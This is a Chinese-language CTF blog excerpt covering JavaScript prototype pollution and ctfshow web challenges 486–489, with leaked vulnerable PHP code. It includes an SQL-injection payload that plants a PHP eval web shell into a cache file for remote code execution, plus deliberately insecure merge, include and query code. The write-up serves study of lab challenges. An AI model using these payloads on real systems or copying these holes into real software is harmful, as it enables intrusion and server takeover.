class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span>&amp;query=<span class="hljs-string">&quot;password&quot;</span></span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span></span>&#125;<br></code></pre></td></tr></table></figure><p>在node.js的HTTP处理框架中，等价</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?q</span>uery=&#123;<span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span></span>&#125;<br></code></pre></td></tr></table></figure><h2 id="原型链污染">原型链污染</h2><h3 id="原型链">原型链</h3><p>首先，我们需要明确什么是原型链，这涉及到javascript的一些底层实现。</p><p>以下是内容摘自官方文档：</p><p>对于使用过基于类的语言 (如 Java 或 C++) 的开发者们来说，JavaScript 实在是有些令人困惑 —— JavaScript 是动态的，本身不提供一个 <code>class</code> 的实现。即便是在 ES2015/ES6 中引入了 <code>class</code> 关键字，但那也只是语法糖，JavaScript 仍然是基于原型的。</p><p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong>）。该原型对象也有一个自己的原型对象（<strong>proto</strong>），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p><p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 的实例。</p><p>尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。</p><p>我们来看一个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Father</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.lastname = <span class="hljs-string">&quot;Donald&quot;</span>;<br>    <span class="hljs-built_in">this</span>.firstname = <span class="hljs-string">&quot;Trump&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Son</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.firstname = <span class="hljs-string">&quot;Jack&quot;</span>;<br>&#125;<br><br>Son.prototype = <span class="hljs-keyword">new</span> Father();<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> Son();<br><br><span class="hljs-built_in">console</span>.log(son);<br><span class="hljs-built_in">console</span>.log(son.__proto__ === Son.prototype);<br><span class="hljs-built_in">console</span>.log(son.__proto__)<br><span class="hljs-built_in">console</span>.log(son.__proto__.__proto__)<br><span class="hljs-built_in">console</span>.log(son.__proto__.__proto__.__proto__)<br><span class="hljs-built_in">console</span>.log(son.__proto__.__proto__.__proto__.__proto__)<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">$&#123;son.firstname&#125;</span>, <span class="hljs-subst">$&#123;son.lastname&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>从这个例子的输出，大概能够简单理解出原型链的一个概念。</p><h3 id="污染利用">污染利用</h3><p>我们知道了存在原型链这个概念，那么怎么去利用呢。</p><p>我们再看下面一个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Father</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.lastname = <span class="hljs-string">&quot;Donald&quot;</span>;<br>    <span class="hljs-built_in">this</span>.firstname = <span class="hljs-string">&quot;Trump&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Son</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.firstname = <span class="hljs-string">&quot;Jack&quot;</span>;<br>&#125;<br><br>Son.prototype = <span class="hljs-keyword">new</span> Father();<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> Son();<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">$&#123;son.firstname&#125;</span>, <span class="hljs-subst">$&#123;son.lastname&#125;</span>`</span>)<br><br>son.__proto__.lastname = <span class="hljs-string">&quot;kiki&quot;</span><br><br><span class="hljs-keyword">let</span> other_son = <span class="hljs-keyword">new</span> Son();<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">$&#123;other_son.firstname&#125;</span>, <span class="hljs-subst">$&#123;other_son.lastname&#125;</span>`</span>)<br><br>son.__proto__.__proto__.__proto__.lastname = <span class="hljs-string">&quot;hacker!!!&quot;</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>.lastname)<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Jack, Donald<br>Jack, kiki<br>hacker!!!<br></code></pre></td></tr></table></figure><p>我们可以看到，如果能够利用原型链污染，我们可以直接向上追溯，从而修改控制链上对象的属性修改。</p><p>当然，在实际的Web交互中，我们要确保上传的对象（如json）会被对应的node.js后端解析，从而才能发生原型链污染的利用。</p><p>常见的利用函数如下，大多发生在对象的嵌套copy/merge上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copy</span>(<span class="hljs-params">object1, object2</span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            copy(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="常见污染利用">常见污染利用</h3><p>模板引擎污染（ejs、jade）</p><p>不过这个个人认为锅不在模板，毕竟本身是程序员其他地方导致的原型链被污染了，才会发生具体的污染。</p><p>具体的分析就等后续的博客吧~</p><h2 id="参考博客">参考博客</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html"></a></p><p><a href="https://xz.aliyun.com/t/7184"></a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>node.js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>notes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-中期测评</title>
    <link href="/2023/04/03/blog0029-ctfshow-%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/"/>
    <url>/2023/04/03/blog0029-ctfshow-%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/</url>
    
    <content type="html"><![CDATA[<p>感觉忘了好多Web的知识点，先复习复习</p><span id="more"></span><h2 id="web486-lfi泄露">Web486 LFI泄露</h2><p>首先是抓包，发现action参数直接拼接文件名获取到相应的文件，一通乱找之后发现了大概的逻辑</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;On&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/render_class.php&#x27;</span>);<br><br><br><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$action</span>))&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>render/render_class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;file_class.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">templateUtil</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$arg</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span>&#123;<br><span class="hljs-variable">$templateContent</span>=fileUtil::read(<span class="hljs-string">&#x27;templates/&#x27;</span>.<span class="hljs-variable">$template</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-keyword">return</span> templateUtil::shade(<span class="hljs-variable">$templateContent</span>,<span class="hljs-variable">$arg</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shade</span>(<span class="hljs-params"><span class="hljs-variable">$templateContent</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arg</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$templateContent</span>=str_replace(<span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>.<span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$templateContent</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$templateContent</span>;<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>/render/file_class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fileUtil</span></span>&#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-variable">$filename</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>,<span class="hljs-variable">$content</span>,<span class="hljs-variable">$append</span> =<span class="hljs-number">0</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$append</span>)&#123;<br>file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>,FILE_APPEND);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单来说就是index.php读取action参数，并且读取对应templates/的文件，并且完成初步的渲染。</p><p>当然这里并没有什么渲染，看了wp才知道直接目录穿越包含index.php同目录的下的flag.php即可</p><h2 id="web487-sql注入">Web487 SQL注入</h2><p>同样也是代码泄露，但是源代码有所不同，没有列举出来的文件和上一题相同</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/render_class.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/db_class.php&#x27;</span>);<br><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$action</span>))&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;check&#x27;</span>)&#123;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select id from user where username = md5(&#x27;<span class="hljs-subst">$username</span>&#x27;) and password=md5(&#x27;<span class="hljs-subst">$password</span>&#x27;) order by id limit 1&quot;</span>;<br><span class="hljs-variable">$user</span>=db::select_one(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>/render/render_class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;On&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;file_class.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;cache_class.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">templateUtil</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$arg</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span>&#123;<br><span class="hljs-keyword">if</span>(cache::cache_exists(<span class="hljs-variable">$template</span>))&#123;<br><span class="hljs-keyword">echo</span> cache::get_cache(<span class="hljs-variable">$template</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$templateContent</span>=fileUtil::read(<span class="hljs-string">&#x27;templates/&#x27;</span>.<span class="hljs-variable">$template</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-variable">$cache</span>=templateUtil::shade(<span class="hljs-variable">$templateContent</span>,<span class="hljs-variable">$arg</span>);<br>cache::create_cache(<span class="hljs-variable">$template</span>,<span class="hljs-variable">$cache</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cache</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shade</span>(<span class="hljs-params"><span class="hljs-variable">$templateContent</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arg</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$templateContent</span>=str_replace(<span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>.<span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$templateContent</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$templateContent</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>/render/db_class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;On&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">db</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConnection</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;root&#x27;</span>;<br> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;root&#x27;</span>;<br> <span class="hljs-variable">$port</span>=<span class="hljs-string">&#x27;3306&#x27;</span>;<br> <span class="hljs-variable">$addr</span>=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br> <span class="hljs-variable">$database</span>=<span class="hljs-string">&#x27;ctfshow&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$addr</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$database</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select_one</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;<br><span class="hljs-variable">$conn</span> = db::getConnection();<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>-&gt;fetch_object();<br>&#125;<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>render/cache_class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;On&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cache</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_cache</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$content</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&#x27;cache/&#x27;</span>.md5(<span class="hljs-variable">$template</span>).<span class="hljs-string">&#x27;.php&#x27;</span>))&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>fileUtil::write(<span class="hljs-string">&#x27;cache/&#x27;</span>.md5(<span class="hljs-variable">$template</span>).<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-variable">$content</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_cache</span>(<span class="hljs-params"><span class="hljs-variable">$template</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> fileUtil::read(<span class="hljs-string">&#x27;cache/&#x27;</span>.md5(<span class="hljs-variable">$template</span>).<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cache_exists</span>(<span class="hljs-params"><span class="hljs-variable">$template</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> file_exists(<span class="hljs-string">&#x27;cache/&#x27;</span>.md5(<span class="hljs-variable">$template</span>).<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这道题麻烦的点在于中间加了一个cache缓存文件，如果没写对，就只能重启环境再写了。</p><p>可以利用SQL注入，然后将username注入模板中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">passwd = <span class="hljs-number">123</span><span class="hljs-string">&#x27;) or md5(&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;)=md5(&#x27;</span><span class="hljs-number">123</span><br>username = <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); phpinfo(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这样再去访问该页面的时候，就能够打出RCE了。</p><h2 id="web488-sql注入">Web488 SQL注入</h2><p>这道题的代码和上一题几乎一致，就修改了SQL注入部分代码</p><p>你可以使用md5绕过SQL注入的tricky密码：ffifdyop，但是这样验证通过也无法完成攻击。</p><p>真正的漏洞点存在与error页面的username的渲染，直接完成模板注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/render_class.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/db_class.php&#x27;</span>);<br><br><br><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$action</span>))&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;check&#x27;</span>)&#123;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select id from user where username = &#x27;&quot;</span>.md5(<span class="hljs-variable">$username</span>).<span class="hljs-string">&quot;&#x27; and password=&#x27;&quot;</span>.md5(<span class="hljs-variable">$password</span>).<span class="hljs-string">&quot;&#x27; order by id limit 1&quot;</span>;<br><span class="hljs-variable">$user</span>=db::select_one(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;error&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>));<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="web489-变量覆盖">Web489 变量覆盖</h2><p>这道题还是只改了index.php的代码，此处有变量覆盖的漏洞，因此直接利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 